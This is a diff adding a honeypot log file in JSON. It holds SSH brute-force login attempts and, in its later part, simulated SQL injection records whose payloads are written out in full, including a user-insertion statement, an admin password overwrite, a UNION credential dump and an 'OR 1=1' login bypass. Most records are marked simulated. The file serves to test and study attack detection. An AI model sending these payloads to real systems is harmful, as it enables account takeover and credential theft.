@@ -1,0 +1,4570 @@
+{
+  "46c90c5a-4228-4efe-826e-e513d2c9deab": {
+    "id": "46c90c5a-4228-4efe-826e-e513d2c9deab",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 17:38:31",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "fake_user",
+    "password": "admin",
+    "details": {
+      "raw_log": "2025-03-31T17:38:31+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'fake_user'/b'admin'] failed"
+    },
+    "attack_hash": "54fcfb9d0203c5c836a63803e6d52c5b"
+  },
+  "a1863c17-f2af-4801-8990-a9093789d5e4": {
+    "id": "a1863c17-f2af-4801-8990-a9093789d5e4",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 17:38:35",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "fake_user",
+    "password": "hello",
+    "details": {
+      "raw_log": "2025-03-31T17:38:35+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'fake_user'/b'hello'] failed"
+    },
+    "attack_hash": "4402696c33a79ee976fe1ca0a3d926aa"
+  },
+  "a328cdb0-9940-45de-9863-c2ec803cdc5e": {
+    "id": "a328cdb0-9940-45de-9863-c2ec803cdc5e",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 17:38:38",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "fake_user",
+    "password": "123",
+    "details": {
+      "raw_log": "2025-03-31T17:38:38+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'fake_user'/b'123'] failed"
+    },
+    "attack_hash": "0d1f10bf41a38109e83060664de77222"
+  },
+  "7f08bfe5-dfc5-44e1-8755-1d20ae6b1dbd": {
+    "id": "7f08bfe5-dfc5-44e1-8755-1d20ae6b1dbd",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 17:40:55",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "hello",
+    "details": {
+      "raw_log": "2025-03-31T17:40:55+0000 [HoneyPotSSHTransport,1,172.17.0.1] login attempt [b'honeypot'/b'hello'] failed"
+    },
+    "attack_hash": "d5dcaa5d73e73ba5dd05e3d3f8aa8d60"
+  },
+  "8999b7cf-6cf5-417e-ae5f-8f03b345716f": {
+    "id": "8999b7cf-6cf5-417e-ae5f-8f03b345716f",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 17:51:46",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "hhd",
+    "details": {
+      "raw_log": "2025-03-31T17:51:46+0000 [HoneyPotSSHTransport,2,172.17.0.1] login attempt [b'honeypot'/b'hhd'] failed"
+    },
+    "attack_hash": "a307afe1b78d5de7eb89e8dcf301eb5d"
+  },
+  "7ff447c8-3aaa-4267-8fc0-cc8b7471c200": {
+    "id": "7ff447c8-3aaa-4267-8fc0-cc8b7471c200",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 17:51:50",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "kdkd",
+    "details": {
+      "raw_log": "2025-03-31T17:51:50+0000 [HoneyPotSSHTransport,2,172.17.0.1] login attempt [b'honeypot'/b'kdkd'] failed"
+    },
+    "attack_hash": "52b97f4b1c33d2315d04b7d03e3e9f3f"
+  },
+  "5abdd483-5e50-480e-89f4-bc1a757cffda": {
+    "id": "5abdd483-5e50-480e-89f4-bc1a757cffda",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 19:12:14",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "hello",
+    "details": {
+      "raw_log": "2025-03-31T19:12:14+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'hello'] failed"
+    },
+    "attack_hash": "02d149645adb486a25b9f20590a932ae"
+  },
+  "6b35a56c-7095-408e-b087-ea621cf0e582": {
+    "id": "6b35a56c-7095-408e-b087-ea621cf0e582",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 19:12:18",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "123",
+    "details": {
+      "raw_log": "2025-03-31T19:12:18+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'123'] failed"
+    },
+    "attack_hash": "ed89d9fb0e1ce497322c689cb83909f7"
+  },
+  "f1c68d8e-aa74-4960-a94a-6b5d8f0cd110": {
+    "id": "f1c68d8e-aa74-4960-a94a-6b5d8f0cd110",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 19:12:20",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "456",
+    "details": {
+      "raw_log": "2025-03-31T19:12:20+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'456'] failed"
+    },
+    "attack_hash": "8bd00abea50c17b164249d5bd80006be"
+  },
+  "1231b40e-079b-4257-b4c0-83d0b5246051": {
+    "id": "1231b40e-079b-4257-b4c0-83d0b5246051",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 19:42:42",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "passwod",
+    "details": {
+      "raw_log": "2025-03-31T19:42:42+0000 [HoneyPotSSHTransport,1,172.17.0.1] login attempt [b'honeypot'/b'passwod'] failed"
+    },
+    "attack_hash": "81f44d4f5a55af620248575c85daf589"
+  },
+  "e61b9bb8-602a-44af-a4eb-f158845775cc": {
+    "id": "e61b9bb8-602a-44af-a4eb-f158845775cc",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 19:42:46",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "udit",
+    "details": {
+      "raw_log": "2025-03-31T19:42:46+0000 [HoneyPotSSHTransport,1,172.17.0.1] login attempt [b'honeypot'/b'udit'] failed"
+    },
+    "attack_hash": "32eeb143c8d640668aad3b30102fa173"
+  },
+  "2dcd628f-55a1-4848-87dc-309e9f2785e7": {
+    "id": "2dcd628f-55a1-4848-87dc-309e9f2785e7",
+    "honeypot_id": "f49f0c4e-4122-45b2-8bb7-e24442be7315",
+    "timestamp": "2025-03-31 19:42:50",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "devraj",
+    "details": {
+      "raw_log": "2025-03-31T19:42:50+0000 [HoneyPotSSHTransport,1,172.17.0.1] login attempt [b'honeypot'/b'devraj'] failed"
+    },
+    "attack_hash": "efaa902ef8b6354c2627f0e43cae3e90"
+  },
+  "a15a1a2c-189d-4ef8-99dc-a75a401f8287": {
+    "id": "a15a1a2c-189d-4ef8-99dc-a75a401f8287",
+    "honeypot_id": "6b0436e4-4a46-45e7-b03e-ed8e80b9f88f",
+    "timestamp": "2025-03-31 19:44:48",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "udit",
+    "details": {
+      "raw_log": "2025-03-31T19:44:48+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'udit'] failed"
+    },
+    "attack_hash": "50088aabd007017fe58ca24cdbf381fa"
+  },
+  "7fcbb66d-9092-48e5-a34c-79ef2efecdd5": {
+    "id": "7fcbb66d-9092-48e5-a34c-79ef2efecdd5",
+    "honeypot_id": "6b0436e4-4a46-45e7-b03e-ed8e80b9f88f",
+    "timestamp": "2025-03-31 19:44:50",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "devraj",
+    "details": {
+      "raw_log": "2025-03-31T19:44:50+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'devraj'] failed"
+    },
+    "attack_hash": "2b6c438d82dd478e6dfb5a71bfabfad4"
+  },
+  "58be8730-9c1e-4712-8d69-949dcf3db690": {
+    "id": "58be8730-9c1e-4712-8d69-949dcf3db690",
+    "honeypot_id": "6b0436e4-4a46-45e7-b03e-ed8e80b9f88f",
+    "timestamp": "2025-03-31 19:44:54",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "gladwin",
+    "details": {
+      "raw_log": "2025-03-31T19:44:54+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'gladwin'] failed"
+    },
+    "attack_hash": "7ee549eced6bbe4b5dd4db53ffccc22d"
+  },
+  "ae12c0ed-3e1b-485d-97ca-c46e5e2324cf": {
+    "id": "ae12c0ed-3e1b-485d-97ca-c46e5e2324cf",
+    "honeypot_id": "f31b1aca-17fe-4fcb-9849-97c5ed11744f",
+    "timestamp": "2025-03-31 19:58:44",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "devraj",
+    "details": {
+      "raw_log": "2025-03-31T19:58:44+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'devraj'] failed"
+    },
+    "attack_hash": "79302131f023ced59e3dea2fdee4e314"
+  },
+  "f74b583f-65df-4407-a5c2-39e13e7a3a03": {
+    "id": "f74b583f-65df-4407-a5c2-39e13e7a3a03",
+    "honeypot_id": "f31b1aca-17fe-4fcb-9849-97c5ed11744f",
+    "timestamp": "2025-03-31 19:58:48",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "udit",
+    "details": {
+      "raw_log": "2025-03-31T19:58:48+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'udit'] failed"
+    },
+    "attack_hash": "2ff56002e2dbad820d622eacbef04968"
+  },
+  "74f49933-12d5-4c54-b5f9-11800a03e68d": {
+    "id": "74f49933-12d5-4c54-b5f9-11800a03e68d",
+    "honeypot_id": "f31b1aca-17fe-4fcb-9849-97c5ed11744f",
+    "timestamp": "2025-03-31 19:58:53",
+    "source_ip": "172.17.0.1]",
+    "attack_type": "login_attempt",
+    "username": "honeypot",
+    "password": "suryadev",
+    "details": {
+      "raw_log": "2025-03-31T19:58:53+0000 [HoneyPotSSHTransport,0,172.17.0.1] login attempt [b'honeypot'/b'suryadev'] failed"
+    },
+    "attack_hash": "3d3406ea532944c84dc02ec2a39588a1"
+  },
+  "c541af19-8f64-48e1-adf7-71f13c8e8155": {
+    "id": "c541af19-8f64-48e1-adf7-71f13c8e8155",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 22:49:31.285703",
+    "source_ip": "118.11.184.26",
+    "attack_type": "login_attempt",
+    "username": "user",
+    "password": "qwerty",
+    "details": {
+      "raw_log": "2025-04-02T22:49:31.285703 [HoneyPotSSHTransport,0,118.11.184.26] login attempt [b'user'/b'qwerty'] failed",
+      "simulated": true
+    },
+    "attack_hash": "56c9476c669d676479a8fc87698bbd92"
+  },
+  "be3bec53-b562-49b7-9758-b8449adc61a9": {
+    "id": "be3bec53-b562-49b7-9758-b8449adc61a9",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 22:59:06.613858",
+    "source_ip": "109.182.76.220",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "qwerty",
+    "details": {
+      "raw_log": "2025-04-02T22:59:06.613858 [HoneyPotSSHTransport,0,109.182.76.220] login attempt [b'admin'/b'qwerty'] failed",
+      "simulated": true
+    },
+    "attack_hash": "fa61304ab221deeac2b4bfbe73d7dc98"
+  },
+  "24a1b7ec-78cd-411e-a4b6-c66bfc297a36": {
+    "id": "24a1b7ec-78cd-411e-a4b6-c66bfc297a36",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:04:22.369777",
+    "source_ip": "129.75.172.84",
+    "attack_type": "login_attempt",
+    "username": "test",
+    "password": "admin",
+    "details": {
+      "raw_log": "2025-04-02T23:04:22.369777 [HoneyPotSSHTransport,0,129.75.172.84] login attempt [b'test'/b'admin'] failed",
+      "simulated": true
+    },
+    "attack_hash": "0734493351488d14e2fa6bd39583d43d"
+  },
+  "6e3bd141-7558-4459-aed6-5e4df4122123": {
+    "id": "6e3bd141-7558-4459-aed6-5e4df4122123",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:09:48.051855",
+    "source_ip": "44.204.23.138",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:09:48.051855 [HoneyPotSSHTransport,0,44.204.23.138] login attempt [b'guest'/b'root'] failed"
+    },
+    "attack_hash": "c41b283a851a247229af783b46b8ca14"
+  },
+  "9158d42a-3f0d-49cf-b7e3-d1946f58430e": {
+    "id": "9158d42a-3f0d-49cf-b7e3-d1946f58430e",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:10:00.054871",
+    "source_ip": "255.237.2.253",
+    "attack_type": "login_attempt",
+    "username": "test",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:10:00.054871 [HoneyPotSSHTransport,0,255.237.2.253] login attempt [b'test'/b'admin'] failed"
+    },
+    "attack_hash": "068138c859491247db9cc75decd6225c"
+  },
+  "12e18ee7-2928-4a08-a1ff-03ebbe57b8c3": {
+    "id": "12e18ee7-2928-4a08-a1ff-03ebbe57b8c3",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:10:12.367054",
+    "source_ip": "77.134.228.240",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "admin",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:10:12.367054 [HoneyPotSSHTransport,0,77.134.228.240] login attempt [b'admin'/b'admin'] failed"
+    },
+    "attack_hash": "cabc1dee4da488159e39c84b74e4c572"
+  },
+  "9d1bfd3d-9d8e-4110-b6de-cb89bbe8506e": {
+    "id": "9d1bfd3d-9d8e-4110-b6de-cb89bbe8506e",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:10:24.044657",
+    "source_ip": "163.63.238.241",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "123456",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:10:24.044657 [HoneyPotSSHTransport,0,163.63.238.241] login attempt [b'admin'/b'123456'] failed"
+    },
+    "attack_hash": "4a11bce24d931b960b82fe6384ba223d"
+  },
+  "9acb49ec-82c4-46b2-932a-dd0efa6bd49a": {
+    "id": "9acb49ec-82c4-46b2-932a-dd0efa6bd49a",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:10:36.362973",
+    "source_ip": "232.102.214.165",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "123456",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:10:36.362973 [HoneyPotSSHTransport,0,232.102.214.165] login attempt [b'admin'/b'123456'] failed"
+    },
+    "attack_hash": "e6169a473775361016e6a5eb816ab36d"
+  },
+  "5898dfdc-16d4-44c5-9cdf-123ec240e6be": {
+    "id": "5898dfdc-16d4-44c5-9cdf-123ec240e6be",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:10:48.052797",
+    "source_ip": "4.155.193.62",
+    "attack_type": "login_attempt",
+    "username": "guest",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:10:48.052797 [HoneyPotSSHTransport,0,4.155.193.62] login attempt [b'guest'/b'qwerty'] failed"
+    },
+    "attack_hash": "431a4ab713dd912d7bc9f82a241013d7"
+  },
+  "22013d1e-dab1-4c7d-90c9-fd069a562f37": {
+    "id": "22013d1e-dab1-4c7d-90c9-fd069a562f37",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:11:00.043151",
+    "source_ip": "74.130.56.39",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "password",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:11:00.043151 [HoneyPotSSHTransport,0,74.130.56.39] login attempt [b'admin'/b'password'] failed"
+    },
+    "attack_hash": "ef018d92d44d16ba0153047f21a4a685"
+  },
+  "96f4fec9-dacd-488c-9619-71fc43d3024c": {
+    "id": "96f4fec9-dacd-488c-9619-71fc43d3024c",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:11:12.045986",
+    "source_ip": "242.5.165.215",
+    "attack_type": "login_attempt",
+    "username": "admin",
+    "password": "root",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:11:12.045986 [HoneyPotSSHTransport,0,242.5.165.215] login attempt [b'admin'/b'root'] failed"
+    },
+    "attack_hash": "7bb8332decde1994f1dbcd2255424fcd"
+  },
+  "a92efec3-7e48-4adf-904f-1444ef639b22": {
+    "id": "a92efec3-7e48-4adf-904f-1444ef639b22",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:11:24.056634",
+    "source_ip": "173.36.20.42",
+    "attack_type": "login_attempt",
+    "username": "root",
+    "password": "qwerty",
+    "details": {
+      "simulated": true,
+      "raw_log": "2025-04-02T23:11:24.056634 [HoneyPotSSHTransport,0,173.36.20.42] login attempt [b'root'/b'qwerty'] failed"
+    },
+    "attack_hash": "24b780a973165ab1f03315af86fe19e4"
+  },
+  "1603fbe2-9f97-473c-bf37-9e7e18ddad9d": {
+    "id": "1603fbe2-9f97-473c-bf37-9e7e18ddad9d",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:18:57.102990",
+    "source_ip": "94.61.111.145",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "'; INSERT INTO users VALUES ('hacker', 'password') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:18:57.102990 [HoneyPotWeb,0,94.61.111.145] SQL injection attempt: '; INSERT INTO users VALUES ('hacker', 'password') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "6bc499a95ce982c4789496ea50aa5eca"
+  },
+  "7812268e-9c75-46ff-b65c-2df91ad69e0f": {
+    "id": "7812268e-9c75-46ff-b65c-2df91ad69e0f",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:03.112383",
+    "source_ip": "93.110.97.105",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "'; INSERT INTO users VALUES ('hacker', 'password') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:03.112383 [HoneyPotWeb,0,93.110.97.105] SQL injection attempt: '; INSERT INTO users VALUES ('hacker', 'password') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "eb19c034c11a1a4c5828e9a1f1b98f41"
+  },
+  "12b321fa-3699-497e-8e47-81494d5e995f": {
+    "id": "12b321fa-3699-497e-8e47-81494d5e995f",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:09.099168",
+    "source_ip": "49.207.250.244",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:09.099168 [HoneyPotWeb,0,49.207.250.244] SQL injection attempt: admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "e74de5596b98681ab17248f2f0d7a2d5"
+  },
+  "ddab034b-5d3f-41c5-befe-d2fb4e18d30a": {
+    "id": "ddab034b-5d3f-41c5-befe-d2fb4e18d30a",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:15.114297",
+    "source_ip": "94.252.35.68",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:15.114297 [HoneyPotWeb,0,94.252.35.68] SQL injection attempt: admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "66f9174b3a084e0641bf4a6e7ee06413"
+  },
+  "2957b6e0-36de-4998-96b6-b4a21639380a": {
+    "id": "2957b6e0-36de-4998-96b6-b4a21639380a",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:21.101339",
+    "source_ip": "195.158.108.12",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "'; INSERT INTO users VALUES ('hacker', 'password') --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:21.101339 [HoneyPotWeb,0,195.158.108.12] SQL injection attempt: '; INSERT INTO users VALUES ('hacker', 'password') --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "654927b4fed2dc60bb61c52746b9082c"
+  },
+  "61976ddb-da00-412c-a0dc-ec94533f36bd": {
+    "id": "61976ddb-da00-412c-a0dc-ec94533f36bd",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:27.410573",
+    "source_ip": "214.88.56.144",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:27.410573 [HoneyPotWeb,0,214.88.56.144] SQL injection attempt: admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "548e545e1e46b1e8f2780c3d02fec864"
+  },
+  "0cb51cc4-76d2-4e62-a491-d3cc22c9d1f0": {
+    "id": "0cb51cc4-76d2-4e62-a491-d3cc22c9d1f0",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:33.108731",
+    "source_ip": "194.229.205.24",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' OR username LIKE '%admin%",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:33.108731 [HoneyPotWeb,0,194.229.205.24] SQL injection attempt: ' OR username LIKE '%admin%",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "b9487a319070e74fad98555dc7e406c2"
+  },
+  "c2c00c68-0256-470c-8d40-2a7b56da4d31": {
+    "id": "c2c00c68-0256-470c-8d40-2a7b56da4d31",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:39.106665",
+    "source_ip": "91.228.31.20",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:39.106665 [HoneyPotWeb,0,91.228.31.20] SQL injection attempt: admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "80fc4deca722088aa06891151fd92dca"
+  },
+  "5903f40d-3443-488f-918a-f837300007f7": {
+    "id": "5903f40d-3443-488f-918a-f837300007f7",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:45.115121",
+    "source_ip": "104.170.193.166",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:45.115121 [HoneyPotWeb,0,104.170.193.166] SQL injection attempt: admin'; UPDATE users SET password='hacked' WHERE username='admin' --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "3c181d0eebd1fff2e5821ef9e880f500"
+  },
+  "9bc52521-8463-489d-9595-558374951363": {
+    "id": "9bc52521-8463-489d-9595-558374951363",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:51.405562",
+    "source_ip": "215.197.59.109",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' OR username LIKE '%admin%",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:51.405562 [HoneyPotWeb,0,215.197.59.109] SQL injection attempt: ' OR username LIKE '%admin%",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "e0917b7249a2116bcbac0e120ecb3dfa"
+  },
+  "38336dff-d9b2-4e01-8d57-519aebb4c2b9": {
+    "id": "38336dff-d9b2-4e01-8d57-519aebb4c2b9",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:19:57.108221",
+    "source_ip": "91.58.91.14",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:19:57.108221 [HoneyPotWeb,0,91.58.91.14] SQL injection attempt: ' UNION SELECT username, password FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "108bc1a2902a0d1da33b541d8d7c11f5"
+  },
+  "bd7f38b3-ac70-4e6b-ab87-84ecc01e0fc8": {
+    "id": "bd7f38b3-ac70-4e6b-ab87-84ecc01e0fc8",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:03.106613",
+    "source_ip": "105.120.148.209",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:03.106613 [HoneyPotWeb,0,105.120.148.209] SQL injection attempt: ' UNION SELECT username, password FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "0e3a5d3381993f1daf17167356ecb7b1"
+  },
+  "877b62c0-8797-4d75-a591-6d9a493f4e71": {
+    "id": "877b62c0-8797-4d75-a591-6d9a493f4e71",
+    "honeypot_id": "593353c2-fac7-4d69-acb4-9225e000a898",
+    "timestamp": "2025-04-02 23:20:09.103433",
+    "source_ip": "180.199.115.154",
+    "attack_type": "sql_injection",
+    "username": null,
+    "password": null,
+    "details": {
+      "simulated": true,
+      "complexity": "moderate",
+      "payload": "' UNION SELECT username, password FROM users --",
+      "target_url": "http://192.168.1.100:22/login",
+      "raw_log": "2025-04-02T23:20:09.103433 [HoneyPotWeb,0,180.199.115.154] SQL injection attempt: ' UNION SELECT username, password FROM users --",
+      "http_method": "POST",
+      "form_fields": {
+        "username": "' OR 1=1 --",
+        "password": "anything"
+      }
+    },
+    "attack_hash": "7429be85acfc9a786810c17c0a7f1dde"
+  },
+  "01c0c944-f455-4778-8c3e-414bcdf24b80": {
+    "id": "01c0c944-f455-4778-8c3e-414bcdf24b80",
